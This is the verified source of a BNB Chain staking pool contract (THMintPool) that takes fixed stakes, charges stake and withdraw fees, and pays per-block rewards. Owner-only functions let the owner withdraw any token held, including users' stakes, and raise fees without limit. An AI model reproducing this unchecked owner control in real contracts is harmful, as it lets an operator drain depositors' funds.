/**
 *Submitted for verification at BscScan.com on 2022-08-23
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsPool is Ownable {
    struct PoolInfo {
        address stakeToken;
        address rewardToken;
        uint256 rewardPerDay;
        uint256 perStakeAmount;
        uint256 totalAmount;
        bool pauseStake;
    }

    struct UserPoolInfo {
        uint256 amount;
        uint256 lastRewardBlock;
    }

    address public _fundAddress;

    mapping(address => UserPoolInfo) private _userPoolInfo;
    PoolInfo private _poolInfo;
    uint256 private _stakeFee = 500;
    uint256 private _withdrawFee = 500;
    uint256 public constant _feeDivFactor = 10000;

    constructor(address StakeToken, address RewardToken, address FundAddress){
        _poolInfo.stakeToken = StakeToken;
        _poolInfo.rewardToken = RewardToken;
        _poolInfo.perStakeAmount = 50 * 10 ** IERC20(StakeToken).decimals();
        _poolInfo.rewardPerDay = 2 * 10 ** IERC20(RewardToken).decimals();
        _fundAddress = FundAddress;
    }

    function stake() external {
        require(!_poolInfo.pauseStake, "pauseStake");

        address account = msg.sender;
        UserPoolInfo storage userPoolInfo = _userPoolInfo[account];
        require(userPoolInfo.amount == 0, "staked");

        uint256 perStakeAmount = _poolInfo.perStakeAmount;
        _poolInfo.totalAmount += perStakeAmount;

        userPoolInfo.amount += perStakeAmount;
        userPoolInfo.lastRewardBlock = block.number;

        _takeToken(_poolInfo.stakeToken, account, address(this), perStakeAmount);
        _takeToken(_poolInfo.stakeToken, account, _fundAddress, perStakeAmount * _stakeFee / _feeDivFactor);
    }

    function unStake() external {
        address account = msg.sender;
        _claimStakeReward(account);
        UserPoolInfo storage userPoolInfo = _userPoolInfo[account];

        uint256 amount = userPoolInfo.amount;
        userPoolInfo.amount = 0;
        _poolInfo.totalAmount -= amount;

        _takeToken(_poolInfo.stakeToken, account, _fundAddress, amount * _withdrawFee / _feeDivFactor);
        _giveToken(_poolInfo.stakeToken, account, amount);
    }

    function claimReward() external {
        _claimStakeReward(msg.sender);
    }

    function _claimStakeReward(address account) private {
        uint256 pendingReward = _getPendingReward(account);
        if (pendingReward > 0) {
            _giveToken(_poolInfo.rewardToken, account, pendingReward);
        }
        UserPoolInfo storage userPoolInfo = _userPoolInfo[account];
        userPoolInfo.lastRewardBlock = block.number;
    }

    function _takeToken(address tokenAddress, address account, address to, uint256 amount) private {
        if (0 == amount) {
            return;
        }
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(account) >= amount, "token balance not enough");
        token.transferFrom(account, to, amount);
    }

    function _giveToken(address tokenAddress, address account, uint256 amount) private {
        if (0 == amount) {
            return;
        }
        IERC20 token = IERC20(tokenAddress);
        require(token.balanceOf(address(this)) >= amount, "pool token not enough");
        token.transfer(account, amount);
    }

    function _getPendingReward(address account) private view returns (uint256 pendingReward){
        UserPoolInfo storage userPoolInfo = _userPoolInfo[account];
        if (0 == userPoolInfo.amount) {
            return 0;
        }
        uint256 lastRewardBlock = userPoolInfo.lastRewardBlock;
        uint256 blockNum = block.number;
    unchecked{
        if (blockNum > lastRewardBlock) {
            pendingReward = _poolInfo.rewardPerDay * (blockNum - lastRewardBlock) / 28800;
        }
    }
    }

    receive() external payable {}

    function getPoolInfo() public view returns (
        address stakeToken,
        address rewardToken,
        uint256 rewardPerDay,
        uint256 perStakeAmount,
        uint256 totalAmount,
        bool pauseStake
    ){
        stakeToken = _poolInfo.stakeToken;
        rewardToken = _poolInfo.rewardToken;
        rewardPerDay = _poolInfo.rewardPerDay;
        perStakeAmount = _poolInfo.perStakeAmount;
        totalAmount = _poolInfo.totalAmount;
        pauseStake = _poolInfo.pauseStake;
    }

    function getPoolTokenInfo() external view returns (
        uint256 stakeTokenDecimals, string memory stakeTokenSymbol,
        uint256 rewardTokenDecimals, string memory rewardTokenSymbol,
        uint256 stakeFee, uint256 withdrawFee
    ){
        stakeTokenDecimals = IERC20(_poolInfo.stakeToken).decimals();
        stakeTokenSymbol = IERC20(_poolInfo.stakeToken).symbol();
        rewardTokenDecimals = IERC20(_poolInfo.rewardToken).decimals();
        rewardTokenSymbol = IERC20(_poolInfo.rewardToken).symbol();
        stakeFee = _stakeFee;
        withdrawFee = _withdrawFee;
    }

    function getUserPoolInfo(address account) public view returns (
        uint256 amount,
        uint256 lastRewardBlock,
        uint256 pendingReward,
        uint256 stakeTokenBalance,
        uint256 stakeTokenAllowance
    ){
        UserPoolInfo storage userPoolInfo = _userPoolInfo[account];
        amount = userPoolInfo.amount;
        lastRewardBlock = userPoolInfo.lastRewardBlock;
        pendingReward = _getPendingReward(account);
        stakeTokenBalance = IERC20(_poolInfo.stakeToken).balanceOf(account);
        stakeTokenAllowance = IERC20(_poolInfo.stakeToken).allowance(account, address(this));
    }

    function setFundAddress(address adr) external onlyOwner {
        _fundAddress = adr;
    }

    function setStakeToken(address adr) external onlyOwner {
        require(_poolInfo.totalAmount == 0, "started");
        _poolInfo.stakeToken = adr;
    }

    function setRewardToken(address adr) external onlyOwner {
        _poolInfo.rewardToken = adr;
    }

    function setRewardPerDay(uint256 rewardPerDay) external onlyOwner {
        _poolInfo.rewardPerDay = rewardPerDay;
    }

    function setPerStakeAmount(uint256 perStakeAmount) external onlyOwner {
        _poolInfo.perStakeAmount = perStakeAmount;
    }

    function setPauseStake(bool pauseStake) external onlyOwner {
        _poolInfo.pauseStake = pauseStake;
    }

    function setStateFee(uint256 stateFee) external onlyOwner {
        _stakeFee = stateFee;
    }

    function setWithdrawFee(uint256 withdrawFee) external onlyOwner {
        _withdrawFee = withdrawFee;
    }

    function claimBalance(uint256 amount, address to) external onlyOwner {
        payable(to).transfer(amount);
    }

    function claimToken(address token, uint256 amount, address to) external onlyOwner {
        IERC20(token).transfer(to, amount);
    }
}

contract THMintPool is AbsPool {
    constructor() AbsPool(
        address(0x80f45297AdE468a77fa8BCB741E2acFE6cE27B2E),
        address(0xb84222872d6f3D7689DeeC936eC74ff328778BBE),
        address(0x9018446879f2FF174323F6EA83142145f65E3A76)
    ){

    }
}